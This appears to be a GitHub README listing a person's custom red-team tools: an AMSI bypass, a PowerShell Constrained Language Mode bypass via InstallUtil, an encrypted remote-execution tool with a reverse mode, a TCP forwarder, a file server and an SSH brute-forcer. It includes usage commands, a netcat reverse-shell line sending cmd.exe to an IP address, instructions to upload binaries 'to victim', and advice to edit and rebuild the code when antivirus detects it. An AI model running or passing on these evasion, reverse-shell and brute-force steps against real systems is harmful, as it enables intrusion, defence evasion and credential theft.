# Some custom tools for redteaming
I prefer to write my own tool for my own use because of the following reasons:
- improve programming skills
- understand how the tool works
- easily bypass AV
 
You can use the tools in pentest or redteam work. If the tool is detected by AV, don't worry, edit the code a bit and then build again. :)

## List of my tools


### AMSI
---
Golang amsi bypass, currently undetected by Microsoft Defender and possibly other AV solutions
- Usage:
  - Download [amsi.exe](https://github.com/namcuongq/security/blob/main/amsi/amsi.exe) and upload to victim
  - Run amsi.exe and enjoy it.
####
  *Note: if you want to add add parameter to program or open any exe file with bypass amsi mode, You only need put them into file with name godpay in the same directory amsi.exe. Example godpay file:*
  ```
  powershell ipconfig
  or 
  C:\Users\Public\nc.exe 192.168.0.19 8080 -e cmd.exe
  ```
  
### Bypass-CLM
---

- This will build an executable which executes a Full Language Mode powershell session. This method will provide a full powershell session just like running powershell.exe, but not powershell.
- If AppControl is enabled, you can run it with InstallUtil.
- Download [bypass-clm](https://github.com/namcuongq/security/tree/main/bypass-clm) and open it with Visual Studio, then build it.
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U "bypass-clm.exe"
```

### Dir_Server
---
[dir_server](https://github.com/namcuongq/security/tree/main/dir_server) Simple directory listing in http-server like python http-simple-server. You can use it for download file.
```
dir_server [dir] [listen address]
```

### Forward_Tcp
---
[forward_tcp](https://github.com/namcuongq/security/tree/main/forward_tcp) Simple way to create a tunnel from special port to another. Tool like socat but usage very easy.

```
forward_tcp [src] [dst]
```

### NCC
---
Simple Remote Code Execution Tool via http or https which is normally not blocked and to the destination server, effectively bypassing the restrictions on firewall. It works like netcat but only for RCE purposes. All transmitted data is encrypted to avoid detection. It can work in 2 modes normal and reverse:
- normal 
  - In kali(server)
  ```
  ncc -l -s <kali ip>:<port>
  ```
  - In victim
  ```
  ncc -s <kali ip>:<port> -e
  ```
- reverse
  - In kali 
  ```
  ncc -s <victim ip>:<port>
  ```
  - In victim(server)
  ```
  ncc -l -s <victim ip>:<port> -e
  ```

### SSH_Brute
---
[ssh_brute](https://github.com/namcuongq/security/tree/main/ssh_brute) Small tool to help brute force ssh
```
ssh_brute -u <user> -p <password> -h <host>
ssh_brute -U <user file> -P <password file> -hH <host file>
```
  
